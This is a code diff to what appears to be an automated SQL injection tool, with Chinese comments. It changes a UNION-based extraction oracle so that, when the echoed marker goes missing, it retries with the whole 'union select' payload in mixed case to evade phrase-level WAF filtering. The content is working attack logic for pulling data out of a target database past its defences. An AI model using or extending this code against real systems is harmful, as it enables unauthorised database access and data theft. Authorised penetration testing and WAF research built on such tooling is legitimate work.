@@ -12,6 +12,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from .builder import PayloadBuilder
 from .dbms import get_dialect
+from ..tampers import mixed_case
 from .models import InjectionPoint, ResponseInfo, WafReport, similarity
 from .session import HttpSession
 
@@ -71,12 +72,13 @@ class UnionOracle(BaseOracle):
         if self.waf.is_filtered("concat", "union", "select"):
             raise OracleError("union/select/concat 被过滤")
         self.output_filtered = False   # 输出侧过滤：含数字的回显行被目标吞掉
+        self._case_mutate = False      # union select 词组被滤 → 整包混合大小写
 
     def scalar(self, expr: str) -> str:
         if self.output_filtered:
             return self._scalar_encoded(expr)
         try:
-            return self._scalar_raw(expr)
+            return self._scalar_raw(expr, mutate=self._case_mutate)
         except OracleError as e:
             if "回显标记未找到" not in str(e):
                 raise
@@ -85,14 +87,22 @@ class UnionOracle(BaseOracle):
                 self.s.log("INFO", "[union] 检出输出侧过滤（含数字的回显行被吞）"
                                    "→ 切换字母编码取数")
                 return self._scalar_encoded(expr)
+            if not self._case_mutate:
+                # 词组级过滤（如 union select 被大小写敏感 strip，token 级扫描
+                # 看不出来）：整包混合大小写自愈重试
+                self._case_mutate = True
+                self.s.log("INFO", "[union] 回显失败 → 尝试整包大小写混淆")
+                return self._scalar_raw(expr, mutate=True)
             raise
 
-    def _scalar_raw(self, expr: str) -> str:
+    def _scalar_raw(self, expr: str, mutate: bool = False) -> str:
         n = self.inj.column_count
         pos = self.inj.echo_positions[0] - 1
         cols = ["null"] * n
         cols[pos] = self.dialect.mark_wrap.format(expr=expr)
         payload = self.b.wrap("union select " + ",".join(cols), base_value="0")
+        if mutate:
+            payload = mixed_case(payload)
         self.last_payload = payload
         r = self.s.request_value(payload)
         self.requests += 1
